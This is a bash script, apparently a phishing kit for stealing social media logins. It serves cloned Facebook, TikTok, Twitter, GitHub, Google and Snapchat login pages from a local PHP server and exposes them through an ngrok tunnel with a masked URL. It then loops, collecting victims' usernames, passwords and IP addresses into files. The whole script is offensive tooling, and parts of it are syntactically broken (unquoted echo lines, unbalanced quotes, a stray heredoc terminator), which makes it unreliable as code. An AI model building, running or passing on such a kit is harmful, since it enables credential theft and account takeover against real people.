#!/bin/bash
## Coded : by Prince Gutierrez
## Github : https://github.com/PDGHACK-10
## Version : 1.0.2
## about this tool : SOCIAL MEDIA PHISHING TOOL
## YOUTUBE CHANNEL : PDGHACK-12
blue='\033[31;1m'
red='\033[32;1m'
green='\033[33;1m'
white='\033[34;1m'

dependencies() {

command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
command -v openssh > /dev/null 2>&1 || { echo >&2 "I require openssh but it's not installed. Install it. Aborting."; exit 1; }
 

}





main_menu() {

echo -e $red |||||||||||||||||||||||||||||||CODED  BY  PRINCE GUTIERREZ||||||||||||||||||||
echo -e $red |||||||||||||||||||||||||||||||||||| |||| ||||||||||||||||||||||||||||||||||||
echo -e $red |||||||||||||||||||||||||||||||||||| |01| ||||FACEBOOK||||||||||||||||||||||||
echo -e $red |||||||||||||||||||||||||||||||||||| |02| ||||TIKTOK  ||||||||||||||||||||||||
echo -e $red |||||||||||||||||||||||||||||||||||| |03| ||||TWITTER ||||||||||||||||||||||||
echo -e $red |||||||||||||||||||||||||||||||||||| |04| ||||GITHUB  ||||||||||||||||||||||||
echo -e $red |||||||||||||||||||||||||||||||||||| |05| ||||GOOGLE  ||||||||||||||||||||||||
echo -e $red |||||||||||||||||||||||||||||||||||| |06| ||||SNAPCHAT||||||||||||||||||||||||
echo -e $red |||||||||||||||||||||||||||||||||||| |||| ||||||||||||||||||||||||||||||||||||
read -p $red "ENTER SOCIAL MEDIA TO HACK " hug

if [[ $hug == 1 || $hug == 01 ]]; then
website="facebook"
tunnel_menu

elif [[ $hug == 2 || $hug == 02 ]]; then
website="tiktok"
tunnel_menu

elif [[ $hug == 3 || $hug == 03 ]]; then
website="twitter"
tunnel_menu

elif [[ $hug == 4 || $hug == 04 ]]; then
website="github"
tunnel_menu

elif [[ $hug == 5 || $hug == 05 ]]; then
website="google"
tunnel_menu

elif [[ $hug == 6 || $hug == 06 ]]; then
website="snapchat"
tunnel_menu
fi

}


## Download Ngrok
download_ngrok() {
	url="$1"
	file=`basename $url`
	if [[ -e "$file" ]]; then
		rm -rf "$file"
	fi
	wget --no-check-certificate "$url" > /dev/null 2>&1
	if [[ -e "$file" ]]; then
		unzip "$file" > /dev/null 2>&1
		mv -f ngrok .server/ngrok > /dev/null 2>&1
		rm -rf "$file" > /dev/null 2>&1
		chmod +x .server/ngrok > /dev/null 2>&1
	else
		echo -e "\n${RED}[${WHITE}!${RED}]${RED} Error occured, Install Ngrok manually."
		{ reset_color; exit 1; }
	fi
}

## Install ngrok
install_ngrok() {
	if [[ -e ".server/ngrok" ]]; then
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Ngrok already installed."
	else
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing ngrok..."${WHITE}
		arch=`uname -m`
		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip'
		elif [[ "$arch" == *'aarch64'* ]]; then
			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm64.zip'
		elif [[ "$arch" == *'x86_64'* ]]; then
			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip'
		else
			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip'
		fi
	fi

}


## Setup website and start php server
HOST='127.0.0.1'
PORT='8080'

setup_site() {
	echo -e $red  SETTING NOW SERVER
	cp -rf sites/"$website"/* .server/www
	cp -f sites/ip.php .server/www/
	echo -e STARING NOW PHP SERVER
	cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 & 
}

## Get IP address
capture_ip() {
	IP=$(grep -a 'IP:' .server/www/ip.txt | cut -d " " -f2 | tr -d '\r')
	IFS=$'\n'
	echo -e $red VICTIM PASSWORD FOUND $IP"
	echo -e $red Saved in : pass.txt"
	cat .server/www/pass.txt >> pass.txt
}

## Get credentials
capture_creds() {
	ACCOUNT=$(grep -o 'Username:.*' .server/www/usernames.txt | cut -d " " -f2)
	PASSWORD=$(grep -o 'Pass:.*' .server/www/usernames.txt | cut -d ":" -f2)
	IFS=$'\n'
	echo -e $red Account : $ACCOUNT"
	echo -e $red Password : $PASSWORD"
	echo -e $red Saved in : usernames.txt"
	cat .server/www/usernames.txt >> usernames.txt
	echo -e $red Waiting for Next Login Info, $blueCtrl + C $green to exit. "
}

## Print data
capture_data() {
	echo -e $red Waiting for Login Info, $blue Ctrl + C $white to exit..."
	while true; do
		if [[ -e ".server/www/pass.txt" ]]; then
			echo -e $red Victim IP Found !"
			capture_ip
			rm -rf .server/www/ip.txt
		fi
		sleep 0.75
		if [[ -e ".server/www/usernames.txt" ]]; then
			echo -e $red Login info Found !!"
			capture_creds
			rm -rf .server/www/usernames.txt
		fi
		sleep 0.75
	done
}

## Start ngrok
start_ngrok() {
	echo -e $red STARING WAIT.......http://$HOST:$PORT 
	{ sleep 1; setup_site; }
	echo -e NGROK LAUNCH....."

    if [[ `command -v termux-chroot` ]]; then
        sleep 2 && termux-chroot ./.server/ngrok http "$HOST":"$PORT" > /dev/null 2>&1 
    else
        sleep 2 && ./.server/ngrok http "$HOST":"$PORT" > /dev/null 2>&1 &
    fi

	ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
	ngrok_url1=${ngrok_url#https://}
	echo -e $red URL  : $red $ngrok_url"
	echo -e $red URL  : $red $mask@$ngrok_url1"
	capture_data
}

## Start localhost
start_localhost() {
	echo -e $red STARTING WAIT......... http://$HOST:$PORT 
	setup_site
	echo -e $red Successfully Host : $red http://$HOST:$PORT"
	capture_data
}

## Tunnel selection
tunnel_menu() {

	${RED}[${WHITE}01${RED}]${ORANGE} Localhost
        ${RED}[${WHITE}02${RED}]${ORANGE} Ngrok.io  

	EOF

	read -p " Select a port forwarding service : " REPLY

	if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
		start_localhost
	elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; then
		start_ngrok
	else
		echo -e $blue Invalid Option, Try Again..."
		sleep 1 
                tunnel_menu 
	fi
}
